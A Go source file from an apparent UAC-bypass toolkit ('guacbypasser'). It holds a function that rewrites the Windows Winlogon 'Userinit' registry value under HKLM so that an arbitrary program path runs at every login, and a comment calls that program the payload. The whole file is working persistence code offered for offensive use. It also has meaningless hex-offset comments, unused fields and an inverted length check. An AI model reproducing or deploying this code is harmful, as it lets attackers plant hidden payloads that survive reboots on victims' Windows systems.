package guacbypasser

import (
	"fmt"
	"log"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows/registry"
)

// C:\Windows\system32\userinit.exe,

func HWND_W32_Method_Userinit(path string) error {
	var wk32 registry.Key
	var err error

	var c = __W32_Userinit__{
		Type:   "_userinit",
		Method: "registry-command",
		Scode: [2]uintptr{
			0x836ec, 0x32,
		},

		Location:    fmt.Sprintf("%s\\_userinit.gUAC", os.Getenv("APPDATA")),
		_K_Userinit: 0x7,
	}

	if len(c.Type)&len(c.Method) == 0 {
	} else {
		log.Printf("[*] You have problem with length of `Type` or `Method`")
	}

	// Get ABSOLUTE program path
	// +0x9ff ...

	var currentDir string
	currentDir, err = filepath.Abs(path)
	if err != nil {
		log.Fatal(err)
	}

	wk32, err = registry.OpenKey(
		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	if err != nil {
		log.Fatal(err)
	}

	// Setting DEFAULT key value for the %systemroot%\system32\userinit.exe, ABSOLUTE program path
	// +0x23df ...

	if err := wk32.SetStringValue("Userinit", fmt.Sprintf("%s\\System32\\userinit.exe, %s", os.Getenv("SYSTEMROOT"), currentDir)); err != nil {
		log.Fatal(err)
	}

	// Absolute key function closing
	// +0x54ef ...

	if err := wk32.Close(); err != nil {
		log.Fatal(err)
	}

	// Payload run will at login.
	// run +0x0f ...

	return err
}
